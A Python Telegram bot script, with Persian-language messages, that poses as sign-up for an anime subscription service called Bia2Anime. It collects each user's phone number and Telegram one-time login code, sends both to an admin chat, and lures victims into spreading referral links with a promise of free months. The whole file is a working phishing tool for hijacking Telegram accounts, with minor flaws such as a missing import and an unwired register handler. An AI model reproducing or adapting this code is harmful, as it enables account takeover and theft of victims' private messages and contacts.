 from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from telegram import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
import logging
import os

# تنظیمات اولیه
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

TOKEN = os.environ['TOKEN']
ADMIN_ID = os.environ['ADMIN_ID']

# حالت‌های گفتگو
PHONE, CODE = range(2)

def start(update, context):
    context.user_data.clear()
    update.message.reply_text(
        "📚 بیاتوانیمه | از سال 1396\n"
        "✉️ ارتباط: bia2anime.com@gmail.com\n\n"
        "برای ثبت نام /register را ارسال کنید"
    )

def register(update, context):
    keyboard = [[KeyboardButton("ارسال شماره 📞", request_contact=True)]]
    update.message.reply_text(
        "لطفاً شماره تلفن خود را ارسال کنید:",
        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    )
    return PHONE

def receive_phone(update, context):
    phone = update.message.contact.phone_number
    context.user_data['phone'] = phone
    update.message.reply_text(
        "✅ شماره دریافت شد!\nکد 5 رقمی تلگرام را وارد کنید:",
        reply_markup=ReplyKeyboardRemove()
    )
    return CODE

def receive_code(update, context):
    code = update.message.text
    if len(code) == 5 and code.isdigit():
        context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📌 ثبت نام جدید:\n📞 شماره: {context.user_data['phone']}\n🔢 کد: {code}"
        )
        update.message.reply_text(
            "✅ ثبت نام کامل شد!\n\n"
            "لینک دعوت شما:\n"
            f"https://t.me/{context.bot.username}?start=ref_{update.effective_user.id}\n\n"
            "با دعوت دوستان ۵ ماه اشتراک رایگان دریافت کنید! 😇"
        )
        return -1
    else:
        update.message.reply_text("❌ کد باید 5 رقم باشد! دوباره وارد کنید:")
        return CODE

def cancel(update, context):
    update.message.reply_text("عملیات لغو شد.")
    return -1

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            PHONE: [MessageHandler(Filters.contact, receive_phone)],
            CODE: [MessageHandler(Filters.text & ~Filters.command, receive_code)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    dp.add_handler(conv_handler)
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()